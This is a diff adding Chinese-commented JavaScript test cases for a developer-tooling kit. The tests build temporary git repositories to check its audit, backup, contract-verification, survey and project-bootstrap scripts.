+    if ((bj.structuralGate?.tombstoneComments?.length ?? 0) < 1) return `未检出墓碑注释：${JSON.stringify(bj.structuralGate)}`
+    if ((bj.structuralGate?.excuseSuppressions?.length ?? 0) < 1) return `未检出 excuse suppression：${JSON.stringify(bj.structuralGate)}`
+    if (bj.structuralGate?.status !== 'attention-required') return `structuralGate 状态不对：${bj.structuralGate?.status}`
+    if (bj.doorAssessment?.doorType !== 'one-way' || bj.doorAssessment?.mergeAuthority !== 'human-required') {
+      return `CI workflow 改动未判为 one-way + human-required：${JSON.stringify(bj.doorAssessment)}`
+    }
+    return true
+  } finally { rmTree(dir) }
+}])
+
+cases.push(['govern-audit.mjs Wave 2 扩展：fence-aware 死链接、注释死代码、上帝文件、arch-rules、4 态 worktree 与 record/cluster/sample', async () => {
+  const godLines = Array.from({ length: 820 }, (_, i) => `export const k${i} = ${i}`).join('\n') + '\n'
+  const dir = tmpProject({
+    '.gitignore': '.worktrees/\n',
+    'AGENTS.md': '# gov-w2\n\n```yaml\narch-rules: src/ui/** -> src/db/**\n```\n',
+    'README.md': '# gov-w2\n',
+    'docs/TDD.md': '# TDD\n',
+    'docs/guide.md': [
+      '# Guide',
+      '',
+      '```markdown',
+      '[in-fence](docs/nonexistent-in-fence.md)',
+      '```',
+      '',
+      'Inline code `[in-code](docs/nonexistent-inline.md)` should pass.',
+      '',
+      'Real broken [real-dead](docs/actually-missing.md).',
+    ].join('\n'),
+    'src/db/db.mjs': 'export const db = 1\n',
+    'src/ui/view.mjs': [
+      '// normal header note line 1',
+      '// normal header note line 2',
+      '// normal header note line 3',
+      '// normal header note line 4',
+      '// normal prose comment without code',
+      '// line two prose comment',
+      '// line three prose comment',
+      '// line four prose comment',
+      'import { db } from "../db/db.mjs"',
+      'export const view = () => db',
+      '// const deadA = 1;',
+      '// if (deadA > 0) {',
+      '//   return deadA;',
+      '// }',
+    ].join('\n'),
+    'src/big.mjs': godLines,
+    'src/hot.mjs': 'export const h = 0\n',
+  })
+  gitInit(dir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })
+
+  const wtMerged = join(dir, '.worktrees', 'wt-merged')
+  const wtSquash = join(dir, '.worktrees', 'wt-squash')
+  const wtNoOwn = join(dir, '.worktrees', 'wt-no-own')
+  const wtUnmerged = join(dir, '.worktrees', 'wt-unmerged')
+
+  try {
+    // 构造 4 态 worktree + 1 个 Revert 与 3 次高频修改提交给 sample
+    spawnSync('git', ['checkout', '-qb', 'wt-merged'], { cwd: dir, stdio: 'ignore' })
+    writeFileSync(join(dir, 'src/merged.mjs'), 'export const m = 1\n')
+    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'merged commit'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['checkout', '-q', 'main'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['merge', '--no-ff', 'wt-merged', '-qm', 'merge wt-merged'], { cwd: dir, stdio: 'ignore' })
+
+    spawnSync('git', ['checkout', '-qb', 'wt-squash'], { cwd: dir, stdio: 'ignore' })
+    writeFileSync(join(dir, 'src/sq.mjs'), 'export const sq = 1\n')
+    spawnSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'squash feat'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['checkout', '-q', 'main'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['merge', '--squash', '-q', 'wt-squash'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'squash feat onto main'], { cwd: dir, stdio: 'ignore' })
+
+    for (let k = 1; k <= 3; k += 1) {
+      writeFileSync(join(dir, 'src/hot.mjs'), `export const h = ${k}\n`)
+      spawnSync('git', ['add', 'src/hot.mjs'], { cwd: dir, stdio: 'ignore' })
+      spawnSync('git', ['commit', '-qm', `touch hot ${k}`], { cwd: dir, stdio: 'ignore' })
+    }
+    writeFileSync(join(dir, 'src/hot.mjs'), 'export const h = 2\n')
+    spawnSync('git', ['add', 'src/hot.mjs'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'Revert "touch hot 3"'], { cwd: dir, stdio: 'ignore' })
+
+    spawnSync('git', ['branch', 'wt-no-own', 'main'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['branch', 'wt-unmerged', 'main'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['worktree', 'add', '-q', wtMerged, 'wt-merged'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['worktree', 'add', '-q', wtSquash, 'wt-squash'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['worktree', 'add', '-q', wtNoOwn, 'wt-no-own'], { cwd: dir, stdio: 'ignore' })
+    writeFileSync(join(wtNoOwn, 'wip.txt'), 'uncommitted note\n')
+    spawnSync('git', ['worktree', 'add', '-q', wtUnmerged, 'wt-unmerged'], { cwd: dir, stdio: 'ignore' })
+    writeFileSync(join(wtUnmerged, 'src/unmerged.mjs'), 'export const u = 1\n')
+    spawnSync('git', ['add', '-A'], { cwd: wtUnmerged, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'unique unmerged commit'], { cwd: wtUnmerged, stdio: 'ignore' })
+
+    // 1. reconcile（4 态 worktree）+ audit 全类别扫描验证
+    const rec = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', dir, '--json'])
+    if (rec.status !== 0) return `govern-audit reconcile 失败：${rec.stderr}`
+    const rj = JSON.parse(rec.stdout)
+
+    const aud = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['audit', dir, '--json'])
+    if (aud.status !== 0) return `govern-audit audit 失败：${aud.stderr}`
+    const aj = JSON.parse(aud.stdout)
+    const ids = aj.findings.map((f) => f.id)
+    if (ids.some((id) => id.includes('nonexistent-in-fence') || id.includes('nonexistent-inline'))) {
+      return `围栏代码块内相对链接被误判为死链接：${JSON.stringify(ids)}`
+    }
+    if (!ids.some((id) => id.includes('actually-missing.md'))) return `真实死链接未被检出：${JSON.stringify(ids)}`
+    if (!ids.some((id) => id.startsWith('deadcode.commented-block.src/ui/view.mjs:11'))) {
+      return `注释死代码块未检出或把普通注释误报了：${JSON.stringify(ids)}`
+    }
+    if (ids.some((id) => id.startsWith('deadcode.commented-block.src/ui/view.mjs:5'))) {
+      return `普通自然语言注释块被误判为死代码：${JSON.stringify(ids)}`
+    }
+    if (!ids.includes('hygiene.god-file.src/big.mjs')) return `上帝文件未检出：${JSON.stringify(ids)}`
+    if (!ids.some((id) => id.startsWith('hygiene.arch-boundary.src/ui/view.mjs:'))) {
+      return `arch-rules 边界违例未检出：${JSON.stringify(ids)}`
+    }
+
+    const wc = rj.reconcileSummary?.worktrees?.counts ?? {}
+    if (wc.merged !== 1 || wc.squash_or_rebase_merged !== 1 || wc.no_own_commits !== 1 || wc.unmerged !== 1) {
+      return `worktree 四态识别数量有误：${JSON.stringify(rj.reconcileSummary?.worktrees)}`
+    }
+
+    // 2. record -> cluster -> sample
+    const r1 = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['record', dir, '--module', 'src/ui', '--pattern', 'arch-boundary', '--message', 'direct db import', '--json'])
+    if (r1.status !== 0 || JSON.parse(r1.stdout).ruleSinkCandidate !== false) return `首次 record 判据有误：${r1.stdout}`
+    const r2 = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['record', dir, '--module', 'src/ui', '--pattern', 'arch-boundary', '--message', 'second db import', '--json'])
+    if (r2.status !== 0 || JSON.parse(r2.stdout).ruleSinkCandidate !== true || JSON.parse(r2.stdout).modulePatternCount !== 2) {
+      return `二次 record 未触发下沉候选：${r2.stdout}`
+    }
+
+    const cl = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['cluster', dir, '--signals-only', '--json'])
+    if (cl.status !== 0) return `cluster 失败：${cl.stderr}`
+    const clj = JSON.parse(cl.stdout)
+    if ((clj.cluster?.sinkCandidateCount ?? 0) < 1) return `cluster 未识别下沉候选：${cl.stdout}`
+
+    const smp = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['sample', dir, '--commits', '20', '--json'])
+    if (smp.status !== 0) return `sample 失败：${smp.stderr}`
+    const sj = JSON.parse(smp.stdout)
+    if (sj.revertCount < 1 || !sj.reworkHotspots?.some((h) => h.file === 'src/hot.mjs')) {
+      return `sample 未识别 Revert 与 48h 高频返工热点：${smp.stdout}`
+    }
+    return true
+  } finally {
+    for (const wt of [wtMerged, wtSquash, wtNoOwn, wtUnmerged]) {
+      spawnSync('git', ['worktree', 'remove', '--force', wt], { cwd: dir, stdio: 'ignore' })
+    }
+    rmTree(dir)
+  }
+}])
+
+cases.push(['backup.mjs Wave 3 去重：treeSha256 同内容跳过 unchanged-since-latest、--force 强制与变更重建', async () => {
+  const backupStore = mkdtempSync(join(tmpdir(), 'pf-bk3-'))
+  const bkEnv = { ...process.env, PF_BACKUP_DIR: backupStore }
+  const dir = tmpProject({
+    'package.json': '{"name":"bk-w3","version":"1.0.0"}\n',
+    'src/index.mjs': 'export const v = 1\n',
+  })
+
+  try {
+    const c1 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'pre-forge', '--json'], { env: bkEnv })
+    if (c1.status !== 0) return `pre-forge backup 失败：${c1.stderr}`
+    const j1 = JSON.parse(c1.stdout)
+    if (!j1.created || !j1.treeSha256) return `首次快照缺少 treeSha256：${c1.stdout}`
+
+    // 工作区未变动时立即再次调用 -> 命中 unchanged-since-latest 且不增加快照数
+    const c2 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'equip', '--json'], { env: bkEnv })
+    if (c2.status !== 0) return `二次去重调用失败：${c2.stderr}`
+    const j2 = JSON.parse(c2.stdout)
+    if (j2.created || j2.skippedReason !== 'unchanged-since-latest' || j2.id !== j1.id) {
+      return `相同工作区二次快照未触发 unchanged-since-latest 去重：${c2.stdout}`
+    }
+
+    // 传 --force 必须无视去重写入新快照
+    const c3 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'equip', '--force', '--json'], { env: bkEnv })
+    if (c3.status !== 0) return `--force backup 失败：${c3.stderr}`
+    const j3 = JSON.parse(c3.stdout)
+    if (!j3.created || j3.id === j1.id) return `--force 未生成新快照：${c3.stdout}`
+
+    // 修改文件内容 -> treeSha256 变化并写入新快照
+    writeFileSync(join(dir, 'src/index.mjs'), 'export const v = 2\n')
+    const c4 = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'edit', '--json'], { env: bkEnv })
+    if (c4.status !== 0) return `变更后 backup 失败：${c4.stderr}`
+    const j4 = JSON.parse(c4.stdout)
+    if (!j4.created || !j4.treeSha256 || j4.treeSha256 === j1.treeSha256) {
+      return `文件变更后未生成新 treeSha256 快照：${c4.stdout}`
+    }
+
+    const ls = JSON.parse(runAbs('scripts/backup.mjs', ['list', dir, '--json'], { env: bkEnv }).stdout)
+    if ((ls.backups?.length ?? 0) !== 3) return `预期保留 3 份快照，实际：${ls.backups?.length}`
+    return true
+  } finally {
+    rmTree(dir)
+    rmTree(backupStore)
+  }
+}])
+
+cases.push(['claims.mjs + review.mjs Wave 3：dirs 并入 claim.path、claim.script 核对与零误报防线', async () => {
+  const { claimsOf, verifyClaims } = await import('../lib/claims.mjs')
+  const { reviewProject } = await import('../review.mjs')
+
+  const dir = tmpProject({
+    'package.json': JSON.stringify({
+      name: 'claims-w3',
+      version: '1.0.0',
+      scripts: { test: 'node --test', lint: 'echo ok' },
+    }),
+    'README.md': '# claims-w3\n\n测试契约脚本与目录前缀核对的仓库说明。\n',
+    'docs/TDD.md': '# TDD\n',
+    'src/core/app.mjs': 'export const app = 1\n',
+    'AGENTS.md': [
+      '# claims-w3',
+      '',
+      '## Dev Profile',
+      '',
+      '```yaml',
+      'quick-test: npm test',
+      'full-test: npm run nonexistent-full',
+      'high-risk: src/core/, src/payments/, src/legacy/**, .github/workflows/, none',
+      'do-not-edit: docs/missing-archive/, .worktrees/',
+      '```',
+      '',
+      '## 环境与构建验证',
+      '',
+      '```sh',
+      'npm run lint',
+      'pnpm run nonexistent-check',
+      'npm test # 注释里带 npm run <placeholder> 不应提取',
+      '```',
+      '',
+      '## 高风险路径',
+      '',
+      '| 路径 | 原因 |',
+      '| --- | --- |',
+      '| `src/core/` | 核心目录存在 |',
+      '| `src/removed-dir/` | 已删除目录 |',
+      '',
+    ].join('\n'),
+  })
+  gitInit(dir)
+
+  try {
+    const agentsText = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
+    const c = claimsOf(agentsText)
+    for (const expectedDir of ['src/core/', 'src/payments/', 'src/removed-dir/', 'docs/missing-archive/']) {
+      if (!c.dirs.includes(expectedDir)) return `claimsOf 未提取目录前缀 ${expectedDir}：${JSON.stringify(c.dirs)}`
+    }
+    if (c.dirs.some((d) => d.includes('legacy') || d.includes('.github') || d.includes('.worktrees'))) {
+      return `claimsOf 误把通配符或可选设施列入 dirs：${JSON.stringify(c.dirs)}`
+    }
+    for (const expectedScript of ['test', 'lint', 'nonexistent-full', 'nonexistent-check']) {
+      if (!c.scripts.includes(expectedScript)) return `claimsOf 未提取脚本 ${expectedScript}：${JSON.stringify(c.scripts)}`
+    }
+    if (c.scripts.some((s) => s.includes('placeholder'))) return `claimsOf 误从注释提取脚本：${JSON.stringify(c.scripts)}`
+
+    const rev = await reviewProject(dir)
+    const missingIds = new Set(rev.missing.map((f) => f.id))
+    if (!missingIds.has('claim.path')) return `review.mjs 未把失效目录前缀报进 claim.path：${JSON.stringify([...missingIds])}`
+    if (!missingIds.has('claim.script')) return `review.mjs 未拦截失效 package.json 脚本：${JSON.stringify([...missingIds])}`
+
+    // 反面防误报：无 packageScripts 时不输出假绿也不误报；本仓自身 0 缺失项
+    const noPkgClaims = verifyClaims(agentsText, { conventions: { defaultBranch: 'main' }, ecosystem: {} }, () => true)
+    if (noPkgClaims.some((x) => x.id === 'claim.script')) {
+      return `无 package.json 脚本清单时不应产生 claim.script 条目：${JSON.stringify(noPkgClaims)}`
+    }
+    const selfRev = await reviewProject(SKILL_ROOT)
+    if (selfRev.missing.length > 0) return `本仓库自身 review 存在误报缺失项：${JSON.stringify(selfRev.missing)}`
+    return true
+  } finally {
+    rmTree(dir)
+  }
+}])
+
+cases.push(['survey.mjs + compose-agents.mjs Wave 3：自有技能共存路由、reentry 漂移校准、explorationStrategy 与纯本地非 GitHub 提示', async () => {
+  const { toMarkdown } = await import('../lib/render.mjs')
+  const { FORBIDDEN_PLATFORM_RE } = await import('../lib/protocol.mjs')
+  const { equip } = await import('../equip.mjs')
+
+  // 1. 自有扩展技能（.agents/skills + .claude/skills）自动进入 AGENTS.md 意图路由且与 --check / equip 共存
+  const customDir = tmpProject({
+    'package.json': JSON.stringify({ name: 'custom-sk', version: '1.0.0', scripts: { test: 'node --test' } }),
+    'README.md': '# custom-sk\n\n自有扩展技能并存与重入测试项目。\n',
+    'src/app.mjs': 'export const ok = 1\n',
+    '.agents/skills/my-billing/SKILL.md': [
+      '---',
+      'name: my-billing',
+      'description: Reconcile invoices and ledger entries cleanly. Ignore second sentence details.',
+      '---',
+      '# my-billing',
+    ].join('\n'),
+    '.claude/skills/deploy-guard/SKILL.md': [
+      '---',
+      'name: deploy-guard',
+      'description: Pre-deploy verification checklist for production releases',
+      '---',
+      '# deploy-guard',
+    ].join('\n'),
+  })
+  gitInit(customDir)
+
+  // 2. 跨月重入漂移仓（AGENTS 失效路径+脚本、TDD 失效路径、未登记 src/new-module、非 GitHub 远端）
+  const reentryDir = tmpProject({
+    'package.json': JSON.stringify({ name: 'reentry-demo', version: '1.0.0', scripts: { test: 'node --test' } }),
+    'README.md': '# reentry-demo\n\n跨月重入校准与非 GitHub 远端导航测试仓。\n',
+    'src/existing.mjs': 'export const e = 1\n',
+    'src/new-module/service.mjs': 'export const s = 2\n',
+    'docs/TDD.md': [
+      '# TDD',
+      '',
+      '现有模块 `src/existing.mjs`，已删源码 `src/deleted-tdd.mjs`。',
+      '未来规划示例 `docs/future/plan.md` 与外链 `https://example.com/a.js` 不应误报。',
+    ].join('\n'),
+    'AGENTS.md': [
+      '# reentry-demo',
+      '',
+      '## Dev Profile',
+      '```yaml',
+      'quick-test: npm test',
+      'full-test: npm run removed-script',
+      '```',
+      '',
+      '## 架构',
+      '核心文件：`src/existing.mjs`、`src/old/deleted.mjs`。',
+    ].join('\n'),
+  })
+  gitInit(reentryDir)
+  spawnSync('git', ['remote', 'add', 'origin', 'https://code.example.org/org/reentry-demo.git'], { cwd: reentryDir, stdio: 'ignore' })
+
+  // 3. 空目录与小型干净仓 vs 大仓（> 80 代码文件）explorationStrategy 分级
+  const emptyDir = tmpProject({})
+  const smallCleanDir = tmpProject({
+    'package.json': JSON.stringify({ name: 'small-clean', version: '1.0.0', scripts: { test: 'node --test' } }),
+    'README.md': '# small-clean\n\n小型干净单仓。\n',
+    'src/only.mjs': 'export const a = 1\n',
+  })
+  gitInit(smallCleanDir)
+  const largeFiles = { 'README.md': '# large-repo\n\n大仓多文件分片探索测试。\n', 'package.json': '{"name":"large-repo","version":"1.0.0"}\n' }
+  for (let i = 0; i < 85; i += 1) largeFiles[`src/m${i}.mjs`] = `export const v${i} = ${i}\n`
+  const largeDir = tmpProject(largeFiles)
+
+  try {
+    // 验证自有技能装配、渲染共存与卸载恢复
+    equip(customDir, { noBackup: true })
+    const gen1 = runAbs('scripts/compose-agents.mjs', [customDir, '--no-backup'])
+    if (gen1.status !== 0) return `compose-agents customDir 失败：${gen1.stderr}`
+    const filledCustom = readFileSync(join(customDir, 'AGENTS.md'), 'utf8')
+      .replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
+    writeFileSync(join(customDir, 'AGENTS.md'), filledCustom)
+
+    const agentsCustom = readFileSync(join(customDir, 'AGENTS.md'), 'utf8')
+    if (!agentsCustom.includes('### 项目自有技能（自动识别，与上方研发流并存）') || !agentsCustom.includes('.agents/skills/my-billing/SKILL.md') || !agentsCustom.includes('.claude/skills/deploy-guard/SKILL.md')) {
+      return `AGENTS.md 未包含项目自有扩展技能路由块：\n${agentsCustom.slice(0, 1200)}`
+    }
+    const chkCustom = runAbs('scripts/compose-agents.mjs', [customDir, '--check'])
+    if (chkCustom.status !== 0) return `含自有技能的 AGENTS.md --check 失败：${chkCustom.stderr}`
+
+    const sCustom = await survey(customDir)
+    if ((sCustom.kit?.customSkills?.length ?? 0) !== 2 || !sCustom.kit.customSkills.some((s) => s.name === 'my-billing' && s.summary)) {
+      return `survey customSkills 识别不对：${JSON.stringify(sCustom.kit?.customSkills)}`
+    }
+
+    // 删掉自有技能 -> 重跑 compose-agents 后自有技能区块消失
+    rmTree(join(customDir, '.agents/skills/my-billing'))
+    rmTree(join(customDir, '.claude/skills/deploy-guard'))
+    runAbs('scripts/compose-agents.mjs', [customDir, '--no-backup'])
+    if (readFileSync(join(customDir, 'AGENTS.md'), 'utf8').includes('### 项目自有技能')) {
+      return '移除自有技能后 AGENTS.md 未清理自有技能条件块'
+    }
+
+    // 验证重入漂移、docs.tdd-stale-paths 与非 GitHub 远端无禁词渲染
+    const sRe = await survey(reentryDir)
+    if (!sRe.reentry?.isReentry || !sRe.reentry?.drifted) return `重入仓未检出 drifted：${JSON.stringify(sRe.reentry)}`
+    if (!sRe.reentry.staleAgentPaths.includes('src/old/deleted.mjs')) return `staleAgentPaths 漏检：${JSON.stringify(sRe.reentry)}`
+    if (!sRe.reentry.staleAgentScripts.includes('removed-script')) return `staleAgentScripts 漏检：${JSON.stringify(sRe.reentry)}`
+    if (!sRe.reentry.staleTddPaths.includes('src/deleted-tdd.mjs')) return `reentry.staleTddPaths 未检出失效 TDD 路径：${JSON.stringify(sRe.reentry)}`
+    if (sRe.reentry.staleTddPaths.some((p) => p.includes('docs/future') || p.includes('example.com'))) {
+      return `staleTddPaths 误报了未来路径或 URL：${JSON.stringify(sRe.reentry.staleTddPaths)}`
+    }
+    if (!sRe.reentry.unregisteredTopDirs.includes('src/new-module')) {
+      return `unregisteredTopDirs 未检出新增顶层目录：${JSON.stringify(sRe.reentry.unregisteredTopDirs)}`
+    }
+    if (sRe.explorationStrategy?.tier !== 'parallel-subagents' || !sRe.explorationStrategy.shards.some((s) => s.id === 'conventions-and-skills')) {
+      return `重入漂移仓未切换 parallel-subagents：${JSON.stringify(sRe.explorationStrategy)}`
+    }
+
+    const mdRe = toMarkdown(sRe)
+    if (FORBIDDEN_PLATFORM_RE.test(mdRe)) return '非 GitHub 远端导航或 Markdown 渲染输出了受限平台词汇'
+    if (!mdRe.includes('远端不在 GitHub 上') || !mdRe.includes('跨月重入失步校准')) {
+      return `toMarkdown 缺少非 GitHub 声明或重入校准摘要：\n${mdRe}`
+    }
+
+    const revRe = runAbs('scripts/review.mjs', [reentryDir])
+    if (revRe.status !== 0 && !revRe.stdout) return `review.mjs reentryDir 异常退出：${revRe.stderr}`
+    const { reviewProject } = await import('../review.mjs')
+    const revReObj = await reviewProject(reentryDir)
+    if (!revReObj.missing.some((f) => f.id === 'docs.tdd-stale-paths')) {
+      return `review.mjs 未产出 docs.tdd-stale-paths：${JSON.stringify(revReObj.missing)}`
+    }
+
+    // 验证 explorationStrategy 三档分级：empty -> none、small -> single-pass、>80 files -> parallel-subagents
+    const [sEmpty, sSmall, sLarge] = await Promise.all([survey(emptyDir), survey(smallCleanDir), survey(largeDir)])
+    if (sEmpty.explorationStrategy?.tier !== 'none') return `empty 目录探索策略错误：${JSON.stringify(sEmpty.explorationStrategy)}`
+    if (sSmall.explorationStrategy?.tier !== 'single-pass') return `小型干净仓探索策略错误：${JSON.stringify(sSmall.explorationStrategy)}`
+    if (sLarge.explorationStrategy?.tier !== 'parallel-subagents') return `大型仓未触发 parallel-subagents：${JSON.stringify(sLarge.explorationStrategy)}`
+
+    return true
+  } finally {
+    rmTree(customDir)
+    rmTree(reentryDir)
+    rmTree(emptyDir)
+    rmTree(smallCleanDir)
+    rmTree(largeDir)
+  }
+}])
+
+cases.push(['equip.mjs + survey.mjs Wave 4 (C19)：五语言空目录闭环、computeArtifactPlan 与 docs/todo 优先探测', async () => {
+  const { toMarkdown } = await import('../lib/render.mjs')
+  const { computeArtifactPlan } = await import('../survey.mjs')
+
+  const langs = [
+    { lang: 'node', name: 'demo-node', expected: ['package.json', 'src/index.mjs', 'test/smoke.test.mjs'], entry: 'src/index.mjs' },
+    { lang: 'python', name: 'demo-py', expected: ['pyproject.toml', 'src/demo_py/__init__.py', 'tests/test_smoke.py'], entry: 'src/demo_py/__init__.py' },
+    { lang: 'go', name: 'demo-go', expected: ['go.mod', 'hello.go', 'hello_test.go'], entry: 'hello.go' },
+    { lang: 'rust', name: 'demo-rust', expected: ['Cargo.toml', 'src/lib.rs'], entry: 'src/lib.rs' },
+    { lang: 'docs', name: 'demo-docs', expected: ['docs/guide.md'], entry: 'README.md' },
+  ]
+  const dirs = []
+  try {
+    for (const item of langs) {
+      const dir = tmpProject({})
+      dirs.push(dir)
+      const res = runAbs('scripts/equip.mjs', [dir, '--bootstrap-empty', '--lang', item.lang, '--name', item.name, '--description', `Desc ${item.lang}`])
+      if (res.status !== 0) return `bootstrap-empty(${item.lang}) 失败：${res.stderr}`
+      for (const reqRel of ['.gitattributes', '.gitignore', 'README.md', 'docs/TDD.md', ...item.expected]) {
+        if (!existsSync(join(dir, reqRel))) return `bootstrap-empty(${item.lang}) 缺文件：${reqRel}`
+      }
+      if (!readFileSync(join(dir, '.gitattributes'), 'utf8').includes('* text=auto eol=lf')) {
+        return `bootstrap-empty(${item.lang}) .gitattributes 缺 eol=lf`
+      }
+      if (!readFileSync(join(dir, '.gitignore'), 'utf8').includes('.worktrees/')) {
+        return `bootstrap-empty(${item.lang}) .gitignore 缺 .worktrees/`
+      }
+      const readme = readFileSync(join(dir, 'README.md'), 'utf8')
+      if (readme.includes('project-forge: fill') || readme.includes('img.shields.io')) {
+        return `bootstrap-empty(${item.lang}) README 含占位或假徽章`
+      }
+      const tdd = readFileSync(join(dir, 'docs/TDD.md'), 'utf8')
+      if (tdd.includes('<待补充>') || !tdd.includes(item.entry) || !tdd.includes('arch-rules: none')) {
+        return `bootstrap-empty(${item.lang}) docs/TDD.md 未填实：${tdd}`
+      }
+      if (item.lang === 'node') {
+        const nt = spawnSync(process.execPath, ['--test'], { cwd: dir, encoding: 'utf8', timeout: 30000 })
+        if (nt.status !== 0) return `bootstrap-empty(node) 单测未过：${nt.stderr || nt.stdout}`
+      }
+      if (item.lang === 'python') {
+        const pyBin = ['python3', 'python'].find((b) => spawnSync(b, ['--version'], { stdio: 'ignore' }).status === 0)
+        if (pyBin) {
+          const pt = spawnSync(pyBin, ['-m', 'unittest', 'discover', '-s', 'tests'], { cwd: dir, encoding: 'utf8', timeout: 30000 })
+          if (pt.status !== 0) return `bootstrap-empty(python) unittest 未过：${pt.stderr || pt.stdout}`
+        }
+      }
+      if (item.lang === 'node' || item.lang === 'python') {
+        const sBoot = await survey(dir)
+        if ((sBoot.reentry?.staleTddPaths?.length ?? 0) > 0) {
+          return `bootstrap-empty(${item.lang}) TDD 存在失效路径：${JSON.stringify(sBoot.reentry.staleTddPaths)}`
+        }
+      }
+    }
+
+    // 反面与保护：已有 .agents 自有技能时允许起步且保留；已有 README.md 时拒绝执行且不覆盖
+    const withCustomAgentDir = tmpProject({
+      '.agents/skills/keep-me/SKILL.md': '---\nname: keep-me\ndescription: Custom keep skill.\n---\n# keep-me\n',
+    })
+    dirs.push(withCustomAgentDir)
+    const keepRes = runAbs('scripts/equip.mjs', [withCustomAgentDir, '--bootstrap-empty', '--lang', 'node', '--name', 'keep-demo'])
+    if (keepRes.status !== 0) return `含 .agents 自有技能的空目录拒绝起步：${keepRes.stderr}`
+    if (!readFileSync(join(withCustomAgentDir, '.agents/skills/keep-me/SKILL.md'), 'utf8').includes('Custom keep skill.')) {
+      return 'bootstrap-empty 破坏了既有自有技能文件'
+    }
+
+    const nonEmptyDir = tmpProject({ 'README.md': '# Custom Handcrafted README\n' })
+    dirs.push(nonEmptyDir)
+    const blockRes = runAbs('scripts/equip.mjs', [nonEmptyDir, '--bootstrap-empty', '--lang', 'node', '--name', 'block-demo'])
+    if (blockRes.status === 0) return '非空目录存在 README.md 时未拒绝 --bootstrap-empty'
+    if (readFileSync(join(nonEmptyDir, 'README.md'), 'utf8') !== '# Custom Handcrafted README\n') {
+      return '被拒绝的 --bootstrap-empty 意外修改了既有 README.md'
+    }
+
+    // computeArtifactPlan 空白仓 vs 异构存量仓 + docs/todo 优先于 docs/work
+    const blankDir = tmpProject({})
+    dirs.push(blankDir)
+    const sBlank = await survey(blankDir)
+    const blankPlan = Object.fromEntries((sBlank.artifactPlan ?? []).map((x) => [x.id, x]))
+    if (blankPlan['pre-backup']?.action !== 'skip' || blankPlan['docs-tdd']?.action !== 'skip' || blankPlan['agents-contract']?.action !== 'skip') {
+      return `空白仓 artifactPlan 不符：${JSON.stringify(sBlank.artifactPlan)}`
+    }
+
+    const heteroDir = tmpProject({
+      '.gitattributes': '* text=auto eol=lf\n',
+      '.gitignore': '.worktrees/\nnode_modules/\n',
+      'package.json': '{"name":"hetero","version":"1.0.0","scripts":{"test":"node --test"}}\n',
+      'src/index.mjs': 'export const ok = true\n',
+      'README.md': '# Custom Legacy README\n',
+      'CONTRIBUTING.md': '# Contributing\n',
+      'LICENSE': 'Dual License (MIT OR Apache-2.0)\n',
+      'docs/TDD.md': '# TDD\n\n入口 `src/index.mjs`。\n',
+      'docs/todo/261114-item.md': '# Todo\n',
+      '.agents/skills/custom-ops/SKILL.md': '---\nname: custom-ops\ndescription: Custom ops skill.\n---\n# custom-ops\n',
+      '.github/workflows/ci.yml': 'name: ci\non: [push]\njobs: {}\n',
+    })
+    dirs.push(heteroDir)
+    gitInit(heteroDir)
+    const sHetero = await survey(heteroDir)
+    if (sHetero.conventions?.workDir !== 'docs/todo') {
+      return `存在 docs/todo 时 workDir 未优先选用 docs/todo：${sHetero.conventions?.workDir}`
+    }
+    const planMap = Object.fromEntries((sHetero.artifactPlan ?? []).map((x) => [x.id, x]))
+    if (planMap.readme?.action !== 'preserve') {
+      return `computeArtifactPlan 未将已有 README 标为 preserve：${JSON.stringify(planMap.readme)}`
+    }
+    if (planMap['pre-backup']?.action !== 'snapshot' || planMap.contributing?.action !== 'preserve' || planMap.license?.action !== 'preserve') {
+      return `异构存量仓 artifactPlan 关键动作错误：${JSON.stringify(sHetero.artifactPlan)}`
+    }
+    if (planMap['kit-skills']?.action !== 'equip' || !planMap['kit-skills'].detail.includes('custom-ops')) {
+      return `kit-skills 处置计划未提示保留自有技能：${JSON.stringify(planMap['kit-skills'])}`
+    }
+    const purePlan = computeArtifactPlan(sHetero)
+    if ((purePlan?.length ?? 0) < 10) return 'computeArtifactPlan 导出项数不足 10 项'
+    const mdHetero = toMarkdown(sHetero)
+    if (!mdHetero.includes('## 逐项处置计划') || !mdHetero.includes('preserve')) {
+      return `render.mjs 未输出逐项处置计划表格：\n${mdHetero}`
+    }
+
+    const legacyWorkDir = tmpProject({ 'README.md': '# legacy\n', 'docs/work/01-task.md': '# Task\n' })
+    dirs.push(legacyWorkDir)
+    const sLegacy = await survey(legacyWorkDir)
+    if (sLegacy.conventions?.workDir !== 'docs/work') {
+      return `仅存在存量 docs/work 时未兼容保留：${sLegacy.conventions?.workDir}`
+    }
+
+    return true
+  } finally {
+    for (const d of dirs) rmTree(d)
+  }
+}])
+
